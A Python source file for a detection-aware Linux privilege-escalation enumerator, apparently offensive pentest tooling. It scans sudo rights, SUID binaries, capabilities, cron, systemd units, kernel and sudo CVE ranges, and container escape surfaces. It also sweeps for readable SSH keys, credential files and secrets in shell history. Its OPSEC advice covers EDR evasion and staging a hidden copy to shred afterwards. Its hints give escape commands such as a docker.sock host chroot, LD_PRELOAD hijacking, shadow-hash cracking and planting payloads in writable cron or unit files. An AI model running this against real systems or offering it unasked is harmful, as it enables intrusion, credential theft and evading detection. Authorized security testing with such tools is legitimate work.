#!/usr/bin/env python3
"""
linpriv_enum.py - Dependency-free, detection-aware Linux privilege-escalation enumerator.

Pure Python 3 stdlib (runs on minimal hosts: python3 >= 3.6, no pip installs). Produces a ranked
list of escalation primitives with evidence, and optional JSON output for a finding record.

USAGE:
    python3 linpriv_enum.py                       # --quick (low-noise) by default
    python3 linpriv_enum.py --full                # add full-FS SUID/SGID/cap/ww sweeps (NOISY/EDR-visible)
    python3 linpriv_enum.py --json /dev/shm/.pe.json
    python3 linpriv_enum.py --section sudo,suid,caps,kernel,cron,creds,container

SECTIONS: sysinfo sudo suid sgid caps cron systemd path passwd writable creds kernel container nfs dbus

OPSEC: --quick avoids whole-filesystem walks (no find-storm). Prefer it on EDR-monitored hosts.
       Stage this script in /dev/shm with a dotted name; shred -u when done.
"""
import os
import re
import sys
import stat
import json
import shutil
import argparse
import subprocess
from datetime import datetime

# GTFOBins-able binaries (basename) - SUID/sudo escape candidates worth flagging.
GTFO = {
    "aa-exec","ab","agetty","alpine","ar","aria2c","arj","arp","as","ascii-xfr","ash","aspell","atobm",
    "awk","base32","base64","basenc","basez","bash","bc","bridge","busctl","busybox","byebug","bundler",
    "cabal","capsh","cat","chmod","chown","chroot","cmp","comm","cp","cpio","cpulimit","crash","csh",
    "csvtool","cupsfilter","curl","dash","date","dd","dialog","diff","dig","distcc","dmsetup","docker",
    "dosbox","ed","emacs","env","eqn","expand","expect","file","find","fish","flock","fmt","fold","gawk",
    "gcc","gdb","genie","genisoimage","gimp","grep","gtester","gzip","hd","head","hexdump","highlight",
    "hping3","iconv","install","ionice","ip","ispell","jjs","join","journalctl","jq","jrunscript","ksh",
    "ksshell","ld.so","ldconfig","less","logsave","look","lua","make","man","mawk","more","mosquitto",
    "msgattrib","msgcat","msgconv","msgfilter","msgmerge","msguniq","multitime","mv","mysql","nano",
    "nawk","nc","ncftp","nft","nice","nl","nmap","node","nohup","npm","octave","od","openssl","openvpn",
    "pandoc","paste","pdftex","perl","pg","php","pic","pico","pidstat","pip","posh","pr","puppet","python",
    "python2","python3","rake","readelf","red","redcarpet","restic","rev","rlwrap","rpm","rpmquery","rsync",
    "ruby","run-mailcap","run-parts","rview","rvim","sash","scp","screen","script","sed","service","setarch",
    "sftp","sg","shuf","slsh","smbclient","socat","soelim","sort","split","sqlite3","ss","ssh","start-stop-daemon",
    "stdbuf","strace","strings","sysctl","systemctl","tac","tail","tar","taskset","tbl","tclsh","tcpdump",
    "tee","telnet","tex","tftp","tic","time","timeout","tmux","top","troff","ul","unexpand","uniq","unshare",
    "unzip","update-alternatives","uudecode","uuencode","vagrant","valgrind","vi","view","vim","vimdiff","watch",
    "wc","wget","whiptail","wireshark","xargs","xdotool","xelatex","xetex","xmodmap","xmore","xpad","xxd","xz",
    "yarn","yash","yelp","zip","zsh","zsoelim","zypper",
}

DANGEROUS_CAPS = {
    "cap_setuid","cap_setgid","cap_dac_read_search","cap_dac_override","cap_sys_admin","cap_sys_ptrace",
    "cap_chown","cap_fowner","cap_sys_module","cap_sys_rawio","cap_net_admin","cap_net_raw","cap_sys_chroot",
}

C = {"red":"\033[91m","yel":"\033[93m","grn":"\033[92m","cyn":"\033[96m","dim":"\033[2m","rst":"\033[0m"}
NOCOLOR = not sys.stdout.isatty()
def col(s, c): return s if NOCOLOR else C.get(c, "") + s + C["rst"]

RESULTS = {"meta": {}, "findings": []}

def add(section, severity, title, evidence):
    RESULTS["findings"].append({"section": section, "severity": severity, "title": title, "evidence": evidence})
    tag = {"high": col("[HIGH]", "red"), "med": col("[MED ]", "yel"), "info": col("[INFO]", "cyn")}.get(severity, "[----]")
    print(f"{tag} {col(title,'grn')}")
    if evidence:
        for line in (evidence if isinstance(evidence, list) else [evidence]):
            print("       " + str(line))

def hdr(t):
    print("\n" + col("=== " + t + " ===", "cyn"))

def run(cmd, timeout=15):
    try:
        return subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout).stdout
    except Exception:
        return ""

def readf(p):
    try:
        with open(p, "r", errors="replace") as f:
            return f.read()
    except Exception:
        return ""

# ---------------------------------------------------------------------------
def s_sysinfo():
    hdr("System / Context")
    uname = run("uname -a").strip()
    osr = readf("/etc/os-release")
    kver = run("uname -r").strip()
    idout = run("id").strip()
    glibc = run("ldd --version 2>&1 | head -1").strip()
    RESULTS["meta"].update({"uname": uname, "kernel": kver, "id": idout, "glibc": glibc})
    add("sysinfo", "info", f"kernel {kver}", [uname, idout, glibc])
    pretty = re.search(r'PRETTY_NAME="([^"]+)"', osr)
    if pretty:
        add("sysinfo", "info", f"OS: {pretty.group(1)}", "")

def s_sudo():
    hdr("sudo")
    if not shutil.which("sudo"):
        return
    ver = run("sudo --version 2>/dev/null | head -1").strip()
    RESULTS["meta"]["sudo_version"] = ver
    m = re.search(r"(\d+)\.(\d+)\.(\d+)", ver)
    if m:
        a, b, c = map(int, m.groups())
        tup = (a, b, c)
        # CVE-2025-32463 (chroot): 1.9.14-1.9.17 ; CVE-2025-32462 (host): 1.8.8-1.9.17
        if (1, 9, 14) <= tup <= (1, 9, 17):
            add("sudo", "high", f"sudo {a}.{b}.{c} in CVE-2025-32463 (chroot/NSS) range",
                ["Run: sudo -R $(pwd) /bin/true  -> 'No such file or directory' => vulnerable",
                 "See sudo_cve_2025_check.sh / suid-sudo-capabilities.md"])
        if (1, 8, 8) <= tup <= (1, 9, 17):
            add("sudo", "high", f"sudo {a}.{b}.{c} in CVE-2025-32462 (host option) range",
                ["Exploitable if sudoers has non-ALL Host rules (shared/LDAP sudoers)",
                 "Patched: 1.9.17p1"])
    out = run("sudo -n -l 2>/dev/null")
    if out.strip():
        add("sudo", "high" if ("NOPASSWD" in out or "(ALL" in out) else "med",
            "sudo -l (non-interactive) returned rights", out.strip().splitlines())
        if "env_keep" in out and ("LD_PRELOAD" in out or "LD_LIBRARY_PATH" in out):
            add("sudo", "high", "sudo env_keep preserves LD_PRELOAD/LD_LIBRARY_PATH -> library hijack",
                "Build malicious .so, run: sudo LD_PRELOAD=/dev/shm/pe.so <allowed-cmd>")
        for line in out.splitlines():
            for b in re.findall(r"/[\w./-]+", line):
                base = os.path.basename(b)
                if base in GTFO:
                    add("sudo", "high", f"sudo-allowed GTFOBins binary: {base}",
                        f"Check https://gtfobins.github.io/gtfobins/{base}/#sudo")

def _walk_perm(check, roots=("/"), limit=4000):
    """Generator of paths under roots matching check(st_mode). For --full only."""
    seen = 0
    skip = {"/proc", "/sys", "/dev", "/run"}
    for root in roots:
        for dirpath, dirs, files in os.walk(root, onerror=lambda e: None):
            dirs[:] = [d for d in dirs if os.path.join(dirpath, d) not in skip]
            for name in files:
                p = os.path.join(dirpath, name)
                try:
                    st = os.lstat(p)
                except OSError:
                    continue
                if stat.S_ISLNK(st.st_mode):
                    continue
                if check(st.st_mode):
                    seen += 1
                    yield p, st
                    if seen >= limit:
                        return

def _path_suid_only():
    """Low-noise: only scan $PATH dirs for SUID/SGID."""
    out = []
    for d in os.environ.get("PATH", "/usr/bin:/bin:/usr/sbin:/sbin").split(":"):
        if not d or not os.path.isdir(d):
            continue
        try:
            for name in os.listdir(d):
                p = os.path.join(d, name)
                try:
                    st = os.stat(p)
                except OSError:
                    continue
                if st.st_mode & (stat.S_ISUID | stat.S_ISGID):
                    out.append((p, st))
        except OSError:
            continue
    return out

def s_suid(full):
    hdr("SUID / SGID")
    if full:
        items = list(_walk_perm(lambda m: bool(m & (stat.S_ISUID | stat.S_ISGID))))
        scope = "full filesystem walk (NOISY)"
    else:
        items = _path_suid_only()
        scope = "$PATH only (low-noise; use --full for whole FS)"
    add("suid", "info", f"SUID/SGID scan scope: {scope}", f"{len(items)} set-id files found")
    for p, st in items:
        base = os.path.basename(p)
        kind = []
        if st.st_mode & stat.S_ISUID:
            kind.append("SUID")
        if st.st_mode & stat.S_ISGID:
            kind.append("SGID")
        if base in GTFO:
            add("suid", "high", f"{'/'.join(kind)} GTFOBins binary: {p} (owner uid {st.st_uid})",
                f"https://gtfobins.github.io/gtfobins/{base}/#suid")
        # writable SUID binary itself = direct win
        if os.access(p, os.W_OK):
            add("suid", "high", f"WRITABLE SUID binary: {p}", "Overwrite with your own SUID payload")

def s_caps():
    hdr("File Capabilities")
    out = run("getcap -r / 2>/dev/null")
    if not out.strip():
        return
    for line in out.splitlines():
        low = line.lower()
        hit = [c for c in DANGEROUS_CAPS if c in low]
        if hit:
            add("caps", "high", f"Dangerous capability: {line.strip()}",
                f"Caps: {', '.join(hit)} -> see suid-sudo-capabilities.md")
        else:
            add("caps", "info", f"cap: {line.strip()}", "")

def s_cron():
    hdr("Cron")
    for p in ["/etc/crontab", "/etc/cron.d", "/etc/cron.daily", "/etc/cron.hourly", "/etc/cron.weekly"]:
        if os.path.isdir(p):
            try:
                for name in os.listdir(p):
                    fp = os.path.join(p, name)
                    if os.access(fp, os.W_OK):
                        add("cron", "high", f"WRITABLE cron file: {fp}", "Append a root-run payload")
            except OSError:
                pass
        elif os.path.isfile(p):
            data = readf(p)
            if os.access(p, os.W_OK):
                add("cron", "high", f"WRITABLE {p}", "")
            for ln in data.splitlines():
                if ln.strip().startswith("#") or not ln.strip():
                    continue
                # script referenced by a root cron line
                for tok in ln.split():
                    if tok.startswith("/") and os.path.isfile(tok) and os.access(tok, os.W_OK):
                        add("cron", "high", f"Root cron runs WRITABLE script: {tok}", ln.strip())
                if "*" in ln and any(t in ln for t in ("tar", "rsync", "zip", "chown", "chmod")):
                    add("cron", "med", "Possible wildcard injection in cron", ln.strip())
    sp = "/var/spool/cron"
    if os.path.isdir(sp):
        add("cron", "info", f"crontab spool present: {sp}", run(f"ls -la {sp} {sp}/crontabs 2>/dev/null").strip().splitlines()[:10])

def s_systemd():
    hdr("systemd Units / Timers")
    for base in ["/etc/systemd/system", "/lib/systemd/system", "/usr/lib/systemd/system", "/run/systemd/system"]:
        if not os.path.isdir(base):
            continue
        for dirpath, _, files in os.walk(base):
            for name in files:
                fp = os.path.join(dirpath, name)
                if os.access(fp, os.W_OK):
                    add("systemd", "high", f"WRITABLE unit/timer: {fp}", "Set ExecStart to your payload; daemon-reload")
                else:
                    data = readf(fp)
                    m = re.search(r"ExecStart=-?(\S+)", data)
                    if m and os.path.isfile(m.group(1)) and os.access(m.group(1), os.W_OK):
                        add("systemd", "high", f"{fp} ExecStart points to WRITABLE binary: {m.group(1)}", "")

def s_path():
    hdr("PATH hijack surface")
    for d in os.environ.get("PATH", "").split(":"):
        if d == "" or d == ".":
            add("path", "high", f"Relative/empty PATH entry: '{d or '(empty)'}'", "Drop a fake binary in CWD")
        elif os.path.isdir(d) and os.access(d, os.W_OK):
            add("path", "med", f"WRITABLE PATH dir: {d}", "Place a malicious binary named after a root-run command")

def s_passwd():
    hdr("Critical file permissions")
    for p in ["/etc/passwd", "/etc/shadow", "/etc/sudoers", "/etc/group"]:
        if os.path.exists(p):
            w = os.access(p, os.W_OK)
            r = os.access(p, os.R_OK)
            sev = "high" if (w or (p == "/etc/shadow" and r)) else "info"
            note = []
            if w:
                note.append("WRITABLE")
            if p == "/etc/shadow" and r:
                note.append("READABLE (crack root hash offline: hashcat -m 1800)")
            add("passwd", sev, f"{p}: {'/'.join(note) if note else 'normal perms'}",
                run(f"ls -l {p}").strip())

def s_writable(full):
    hdr("World-writable / other-user files (full only)")
    if not full:
        add("writable", "info", "skipped in --quick (use --full)", "")
        return
    count = 0
    for p, st in _walk_perm(lambda m: bool(m & stat.S_IWOTH), limit=2000):
        if "/proc" in p or "/sys" in p:
            continue
        count += 1
        if count <= 40:
            add("writable", "med", f"world-writable: {p}", "")
    add("writable", "info", f"world-writable files found (capped): {count}", "")

def s_creds():
    hdr("Credential / secret quick sweep")
    candidates = []
    for base in ["/home", "/root", "/var/www", "/opt", "/srv", "/etc"]:
        if not os.path.isdir(base):
            continue
        for dirpath, _, files in os.walk(base):
            depth = dirpath.count("/")
            if depth > 6:
                continue
            for name in files:
                if name in ("id_rsa", "id_ed25519", "id_dsa", ".git-credentials", ".netrc") or \
                   name.endswith((".kdbx", ".ovpn")) or name == ".pgpass":
                    fp = os.path.join(dirpath, name)
                    if os.access(fp, os.R_OK):
                        candidates.append(fp)
            if len(candidates) > 60:
                break
    for fp in candidates[:60]:
        add("creds", "med", f"readable secret-like file: {fp}", "")
    tok = "/var/run/secrets/kubernetes.io/serviceaccount/token"
    if os.path.exists(tok):
        add("creds", "high", "Kubernetes service-account token present", "See container-namespace-escape.md")
    hist = []
    for h in [os.path.expanduser("~/.bash_history"), os.path.expanduser("~/.zsh_history")]:
        d = readf(h)
        for ln in d.splitlines():
            if re.search(r"(pass|secret|token|key|mysql -p|psql|ssh .*@|curl .*://[^ ]*:[^ ]*@)", ln, re.I):
                hist.append(ln.strip())
    if hist:
        add("creds", "med", "Possible creds in shell history", hist[:15])

def s_kernel():
    hdr("Kernel / glibc CVE surface (summary)")
    kver = run("uname -r").strip()
    m = re.match(r"(\d+)\.(\d+)\.(\d+)?", kver)
    if m:
        maj, mino = int(m.group(1)), int(m.group(2))
        ver = (maj, mino)
        if (5, 14) <= ver <= (6, 6):
            add("kernel", "high", f"Kernel {kver}: in CVE-2024-1086 (nf_tables) range 5.14-6.6",
                ["Needs CAP_NET_ADMIN (unshare -rn if unprivileged_userns_clone=1)",
                 "Notselwyn PoC. See kernel-exploits.md"])
        if (5, 8) <= ver <= (5, 16):
            add("kernel", "high", f"Kernel {kver}: Dirty Pipe (CVE-2022-0847) possible (5.8-5.16.11)", "")
    userns = readf("/proc/sys/kernel/unprivileged_userns_clone").strip()
    if userns == "1":
        add("kernel", "med", "unprivileged_userns_clone=1 -> userns LPE preconditions available",
            "Enables CVE-2024-1086 / GameOver(lay) CAP path")
    iouring = readf("/proc/sys/kernel/io_uring_disabled").strip()
    if iouring in ("0", "1"):
        add("kernel", "med", f"io_uring_disabled={iouring} -> io_uring LPE surface present",
            "CVE-2024-0582 / CVE-2025-21836 class")
    bpf = readf("/proc/sys/kernel/unprivileged_bpf_disabled").strip()
    if bpf == "0":
        add("kernel", "med", "unprivileged_bpf_disabled=0 -> unprivileged BPF allowed", "")
    glibc = run("ldd --version 2>&1 | head -1")
    gm = re.search(r"(\d+)\.(\d+)", glibc)
    if gm and (int(gm.group(1)), int(gm.group(2))) <= (2, 37):
        add("kernel", "med", f"glibc {gm.group(0)} <= 2.37 -> Looney Tunables CVE-2023-4911 candidate",
            "Smoke test: env -i GLIBC_TUNABLES=glibc.malloc.tcache_max=glibc.malloc.tcache_max=A A=A /usr/bin/su --help")
    if shutil.which("udisksctl") or os.path.exists("/usr/libexec/udisks2/udisksd"):
        add("kernel", "med", "udisks2 present -> CVE-2025-6019 loop-mount LPE candidate (needs allow_active)",
            "See service-misconfig-lpe.md")
    if shutil.which("pkexec"):
        pv = run("pkexec --version 2>/dev/null").strip()
        add("kernel", "med", f"pkexec present ({pv}) -> check PwnKit CVE-2021-4034 on legacy hosts", "")

def s_container():
    hdr("Containerization / escape surface")
    cg = readf("/proc/1/cgroup")
    incontainer = bool(re.search(r"docker|kubepods|lxc|containerd|libpod", cg)) or os.path.exists("/.dockerenv") or os.path.exists("/run/.containerenv")
    if not incontainer:
        add("container", "info", "Not obviously containerized", "")
        return
    add("container", "high", "Running inside a container", cg.strip().splitlines()[:3])
    if os.path.exists("/var/run/docker.sock"):
        add("container", "high", "docker.sock mounted in container -> trivial host escape",
            "docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host")
    cap = run("grep CapEff /proc/self/status").strip()
    add("container", "info", f"Capabilities: {cap}", "Decode: capsh --decode=<hex>")
    if "0000003fffffffff" in cap or "000001ffffffffff" in cap or "0000001fffffffff" in cap:
        add("container", "high", "Full/near-full capability set (likely --privileged)",
            "Mount host disk or use cgroup release_agent escape")
    rv = run("runc --version 2>/dev/null")
    rm = re.search(r"runc version (\d+)\.(\d+)\.(\d+)", rv)
    if rm:
        rt = tuple(map(int, rm.groups()))
        if rt <= (1, 1, 11):
            add("container", "high", f"runc {'.'.join(map(str,rt))} <= 1.1.11 -> CVE-2024-21626 fd-leak escape",
                "WORKDIR /proc/self/fd/8 ; see container-namespace-escape.md")
    if os.path.exists("/var/run/secrets/kubernetes.io/serviceaccount/token"):
        add("container", "high", "Kubernetes SA token present -> API-driven pod escape",
            "kubectl auth can-i --list --token=$(cat .../token)")

def s_nfs():
    hdr("NFS")
    exp = readf("/etc/exports")
    if "no_root_squash" in exp:
        add("nfs", "high", "/etc/exports has no_root_squash -> SUID-drop root escape", exp.strip().splitlines())
    mounts = run("mount 2>/dev/null")
    for ln in mounts.splitlines():
        if "nfs" in ln:
            add("nfs", "info", f"NFS mount: {ln.strip()}", "")

def s_dbus():
    hdr("D-Bus / polkit (surface)")
    if shutil.which("busctl"):
        out = run("busctl list 2>/dev/null | head -40")
        if out.strip():
            add("dbus", "info", "system D-Bus services present (review for root services w/ permissive policy)",
                "grep -RinE 'allow.*send_destination' /etc/dbus-1/system.d /usr/share/dbus-1/system.d")
    if shutil.which("pkaction"):
        acts = run("pkaction 2>/dev/null | grep -iE 'udisks|packagekit|networkmanager' | head -15")
        if acts.strip():
            add("dbus", "info", "polkit actions of interest", acts.strip().splitlines())

SECTION_FUNCS = {
    "sysinfo": s_sysinfo, "sudo": s_sudo, "caps": s_caps, "cron": s_cron, "systemd": s_systemd,
    "path": s_path, "passwd": s_passwd, "creds": s_creds, "kernel": s_kernel, "container": s_container,
    "nfs": s_nfs, "dbus": s_dbus,
}

def main():
    ap = argparse.ArgumentParser(description="Detection-aware Linux privesc enumerator")
    ap.add_argument("--full", action="store_true", help="enable noisy full-FS sweeps (SUID/SGID/world-writable)")
    ap.add_argument("--quick", action="store_true", help="low-noise mode (default)")
    ap.add_argument("--json", metavar="PATH", help="write JSON evidence to PATH")
    ap.add_argument("--section", help="comma list: " + " ".join(SECTION_FUNCS) + " suid sgid writable")
    args = ap.parse_args()
    full = args.full
    RESULTS["meta"]["timestamp"] = datetime.utcnow().isoformat() + "Z"
    RESULTS["meta"]["mode"] = "full" if full else "quick"

    print(col("linpriv_enum.py", "cyn") + f"  mode={'full' if full else 'quick'}  "
          + datetime.utcnow().strftime("%Y-%m-%d %H:%M:%SZ"))

    if args.section:
        wanted = [s.strip() for s in args.section.split(",")]
        for w in wanted:
            if w == "suid":
                s_suid(full)
            elif w == "sgid":
                s_suid(full)
            elif w == "writable":
                s_writable(full)
            elif w in SECTION_FUNCS:
                SECTION_FUNCS[w]()
    else:
        s_sysinfo(); s_sudo(); s_suid(full); s_caps(); s_cron(); s_systemd()
        s_path(); s_passwd(); s_creds(); s_kernel(); s_container(); s_nfs(); s_dbus()
        if full:
            s_writable(full)

    highs = sum(1 for f in RESULTS["findings"] if f["severity"] == "high")
    print("\n" + col(f"== Summary: {highs} HIGH, {len(RESULTS['findings'])} total findings ==", "yel"))

    if args.json:
        try:
            with open(args.json, "w") as f:
                json.dump(RESULTS, f, indent=2)
            print(col(f"[+] JSON evidence written to {args.json}", "grn"))
        except Exception as e:
            print(col(f"[!] JSON write failed: {e}", "red"))

if __name__ == "__main__":
    main()
